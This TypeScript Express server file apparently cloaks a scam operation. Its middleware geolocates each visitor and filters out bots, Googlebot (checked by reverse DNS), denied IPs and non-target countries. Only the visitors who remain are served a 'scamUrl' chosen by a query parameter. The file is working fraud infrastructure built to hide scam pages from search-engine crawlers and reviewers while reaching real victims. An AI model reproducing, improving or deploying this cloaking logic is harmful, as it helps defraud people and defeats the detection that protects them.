import express, {Express} from "express";
import cors from "cors";
import isbot from 'isbot'
import { ConfigService } from "./services/config.service";
import * as type from './types/generic.type';

import * as fs from "fs";
import * as path from 'path'
import { engine } from 'express-handlebars';

// @ts-ignore
import ipware = require("ipware");
import geoip = require("geoip-lite");

// @ts-ignore
const { verify } = require('reverse-dns-lookup');

class App {
    public app: Express = express();
    private configSrv: ConfigService;

    constructor(){
        this.config();
        this.initEngine();
        this.initValidations();
        this.configSrv = new ConfigService();
    }

    private config(): void {
        this.app.use(cors());
        this.app.use(express.json());
        this.app.use(express.static(path.join(__dirname, 'public')))
        this.app.use(async (req, res, next) => {
            res.header("Access-Control-Allow-Origin", "*");
            res.header(
              "Access-Control-Allow-Headers",
              "Origin,X-Requested-With,Content-Type,Accept,content-type,application/json"
            );
            res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
            res.setHeader('Access-Control-Allow-Headers', '*');
            next();
        });
    }

    private initEngine(): void {
        this.app.set("views", path.join(__dirname, "views"));

        // console.log("VIEWS RUTE => ", path.join(__dirname, "views"));

        // console.log("VIEWS RUTE => ", path.join(__dirname, "views", 'layouts'));


        this.app.engine('.hbs', engine({
            defaultLayout: "main",
            layoutsDir:  path.join(__dirname, "views", 'layouts')  /*path.join(this.app.get("views"), "layouts")*/,
            partialsDir: path.join(__dirname, "views", 'partials') /*path.join(this.app.get("views"), "partials")*/,
            extname: ".hbs",
        }));
        this.app.set('view engine', '.hbs');
    }

    private initValidations(){
        this.app.use(async (req, res, next) => {

            /* =============== START =============== */
            const param = req.query.run as string;
            if (!param) {
                res.locals.isReady = false;
                next();
            }else{
                const get_ip     = ipware().get_ip;
                const ipAddress  = get_ip(req).clientIp;
                const geoData    = geoip.lookup(ipAddress);
    
                const isAllowedContry: type.AllowOrDeny = this.configSrv.checkIfAllowedCountry(geoData?.country || "");
                const isDeniedIp: type.AllowOrDeny = this.configSrv.checkIfDeniedIps(ipAddress);
                const isBots = isbot(req.get('user-agent'));

                /* =============== IP CHECKER =============== */
                const bloqueadorIps = fs.readFileSync(path.join(__dirname, 'public', 'bloqueador_ips.txt'))
                .toString()
                .split('\n')
                .filter(Boolean)
    
                const isBotIp = (referer: string) => {
                    return referer && bloqueadorIps.some(bloker => referer.includes(bloker.trim()))
                }

                /* =============== DNS LOOKUP =============== */
                let isGooglebotServer: boolean = false;
                try {
                    isGooglebotServer = await verify(ipAddress, 'google.com', 'googlebot.com');
                } catch (e) {}


                /* =============== VALIDACION =============== */
                if(!isAllowedContry.isOk || isDeniedIp.isOk || isBots || isBotIp(ipAddress) || isGooglebotServer){
                    res.locals.isReady = false;
                }else{
                    const scamUrl: type.GetStr = this.configSrv.getScamByParams(param);
                    res.locals.isReady = true;
                    res.locals.currentUrl = scamUrl.url;
                }

                next();
            }
        });
    }
}

export default new App();